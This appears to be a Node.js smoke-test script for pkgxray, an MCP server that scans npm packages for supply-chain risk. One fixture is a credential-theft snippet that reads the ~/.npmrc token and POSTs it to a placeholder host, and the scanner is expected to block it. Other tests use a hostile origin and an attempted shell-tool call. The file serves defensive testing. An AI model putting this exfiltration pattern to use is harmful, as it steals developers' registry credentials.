import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import path from 'node:path';
import { pathToFileURL } from 'node:url';

const headers = { 'content-type': 'application/json', accept: 'application/json, text/event-stream', 'mcp-protocol-version': '2025-11-25' };
const tools = ['audit_agent_extension_supply_chain', 'check_npm_package_metadata'];
function checkedUrl(value) {
  const url = new URL(value);
  if (!['http:', 'https:'].includes(url.protocol) || url.username || url.password || url.search || url.hash) throw new Error('Use an HTTP(S) endpoint without credentials, query parameters, or fragments');
  return url;
}

// Bound every exchange, including response bodies and negative test cases.
async function exchange(url, options, fetcher, timeoutMs) {
  const controller = new AbortController();
  let timer;
  const timeout = new Promise((_, reject) => {
    timer = setTimeout(() => { controller.abort(); reject(new Error(`Request deadline exceeded (${timeoutMs} ms)`)); }, timeoutMs);
  });
  try {
    return await Promise.race([timeout, (async () => {
      const response = await fetcher(url, { ...options, redirect: 'manual', signal: controller.signal });
      const chunks = [];
      let size = 0;
      if (response.body) {
        const reader = response.body.getReader();
        const cancel = () => { reader.cancel().catch(() => {}); };
        controller.signal.addEventListener('abort', cancel, { once: true });
        try {
          while (true) {
            const { done, value } = await reader.read();
            if (done) break;
            size += value.byteLength;
            if (size > 256 * 1024) throw new Error('Response exceeds 256 KiB monitor limit');
            chunks.push(Buffer.from(value));
          }
        } finally { controller.signal.removeEventListener('abort', cancel); cancel(); }
      }
      return { status: response.status, headers: response.headers, text: Buffer.concat(chunks).toString('utf8') };
    })()]);
  } finally { clearTimeout(timer); controller.abort(); }
}

export async function runSmoke(endpoint, { fetcher = fetch, timeoutMs = 15000, metadata = true, website } = {}) {
  const url = checkedUrl(endpoint);
  const site = website ? checkedUrl(website) : null;
  const started = performance.now();
  const report = { schemaVersion: 1, startedAt: new Date().toISOString(), endpoint: url.href, passed: false, checks: [], metadataChecks: metadata ? 'enabled' : 'skipped' };
  let id = 0;
  const request = (options, target = url) => exchange(target.href, options, fetcher, timeoutMs);
  const post = (body, extra = {}) => request({ method: 'POST', headers: { ...headers, ...extra }, body });
  async function rpc(method, params) {
    const requestId = ++id;
    const response = await post(JSON.stringify({ jsonrpc: '2.0', id: requestId, method, params }));
    assert.equal(response.status, 200, `${method}: HTTP ${response.status}`);
    const data = JSON.parse(response.text);
    assert.equal(data.id, requestId); assert.equal(data.error, undefined);
    assert.equal(response.headers.get('cache-control'), 'no-store');
    return data.result;
  }
  async function check(name, fn) {
    const begin = performance.now();
    try { await fn(); report.checks.push({ name, passed: true, ms: Math.round(performance.now() - begin) }); }
    catch (error) {
      report.checks.push({ name, passed: false, ms: Math.round(performance.now() - begin), error: String(error.message).slice(0, 500) });
      throw error;
    }
  }
  try {
    await check('health', async () => {
      const response = await request({}, new URL('/health', url)); assert.equal(response.status, 200);
      const health = JSON.parse(response.text);
      assert.equal(health.status, 'ok'); assert.equal(health.executionEnabled, false); assert.deepEqual(health.tools, tools);
    });
    await check('initialize', async () => {
      const init = await rpc('initialize', { protocolVersion: '2025-11-25', capabilities: {}, clientInfo: { name: 'pkgxray-automated-smoke', version: '1' } });
      assert.equal(init.serverInfo.name, 'pkgxray-public'); assert.equal(init.protocolVersion, '2025-11-25');
    });
    await check('initialized notification', async () => assert.equal((await post(JSON.stringify({ jsonrpc: '2.0', method: 'notifications/initialized' }))).status, 202));
    await check('discover exactly the public tools', async () => assert.deepEqual((await rpc('tools/list', {})).tools.map(tool => tool.name), tools));
    await check('benign source stays REVIEW without artifact evidence', async () => {
      const result = (await rpc('tools/call', { name: tools[0], arguments: { sourceFiles: { 'index.js': 'module.exports=42;' } } })).structuredContent;
      assert.equal(result?.verdict, 'review'); assert.equal(result.installationApproved, false); assert.equal(result.coverage.executed, false);
    });
    await check('inert credential-theft source is BLOCK', async () => {
      const result = (await rpc('tools/call', { name: tools[0], arguments: { sourceFiles: { 'index.js': "const fs=require('fs');const token=fs.readFileSync(process.env.HOME+'/.npmrc','utf8');fetch('https://example.invalid/collect',{method:'POST',body:token});" } } })).structuredContent;
      assert.equal(result?.verdict, 'block'); assert.equal(result.installationApproved, false); assert.equal(result.coverage.executed, false);
    });
    if (metadata) {
      await check('known vulnerable npm version is BLOCK', async () => {
        const result = (await rpc('tools/call', { name: tools[1], arguments: { name: 'lodash', version: '4.17.20' } })).structuredContent;
        assert.equal(result?.checks.registry, 'completed'); assert.equal(result.checks.vulnerabilities, 'completed');
        assert.equal(result.verdict, 'block'); assert.ok(result.advisories.length > 0); assert.equal(result.installationApproved, false);
      });
      await check('ordinary npm metadata never approves installation', async () => {
        const result = (await rpc('tools/call', { name: tools[1], arguments: { name: 'picocolors', version: '1.1.1' } })).structuredContent;
        assert.equal(result?.checks.registry, 'completed'); assert.equal(result.checks.vulnerabilities, 'completed'); assert.equal(result.installationApproved, false);
      });
    }
    for (const [name, body, extra, expected] of [
      ['malformed JSON rejected', '{', {}, 400], ['oversized request rejected', 'x'.repeat(25000), {}, 413],
      ['hostile browser origin rejected', JSON.stringify({ jsonrpc: '2.0', id: 99, method: 'ping' }), { origin: 'https://evil.example' }, 403],
      ['unsupported protocol rejected', JSON.stringify({ jsonrpc: '2.0', id: 99, method: 'ping' }), { 'mcp-protocol-version': 'unsupported' }, 400]
    ]) await check(name, async () => assert.equal((await post(body, extra)).status, expected));
    await check('VM and shell tool unavailable', async () => {
      const response = await post(JSON.stringify({ jsonrpc: '2.0', id: 100, method: 'tools/call', params: { name: 'run_vm', arguments: { command: 'id' } } }));
      assert.equal(response.status, 200); assert.equal(JSON.parse(response.text).error.code, -32602);
    });
    await check('standalone GET rejected', async () => assert.equal((await request({})).status, 405));
    if (site) await check('website publishes the working MCP connection URL', async () => {
      const response = await request({}, site); assert.equal(response.status, 200);
      assert.ok(response.text.includes('<code id="mcp-url">https://mcp.pkgxray.ca/mcp</code>'));
      assert.ok(response.text.includes('data-copy-target="mcp-url"'));
      assert.ok(!response.text.includes('__cf_email__'), 'Cloudflare must not rewrite package commands');
    });
    report.passed = true;
  } catch { /* Retain the failed check and partial progress in the report. */ }
  report.durationMs = Math.round(performance.now() - started);
  return report;
}

export async function saveReport(report, file) {
  if (file) { await fs.mkdir(path.dirname(file), { recursive: true }); await fs.writeFile(file, JSON.stringify(report, null, 2) + '\n'); }
}

if (process.argv[1] && import.meta.url === pathToFileURL(path.resolve(process.argv[1])).href) {
  const [endpoint, ...args] = process.argv.slice(2);
  const options = {};
  let output;
  for (let i = 0; i < args.length; i++) {
    if (args[i] === '--skip-metadata') options.metadata = false;
    else if (args[i] === '--report' && args[i + 1]) output = args[++i];
    else if (args[i] === '--website' && args[i + 1]) options.website = args[++i];
    else throw new Error(`Unsupported smoke option: ${args[i]}`);
  }
  const report = await runSmoke(endpoint, options);
  await saveReport(report, output);
  console.log(JSON.stringify(report, null, 2));
  if (!report.passed) process.exitCode = 1;
}
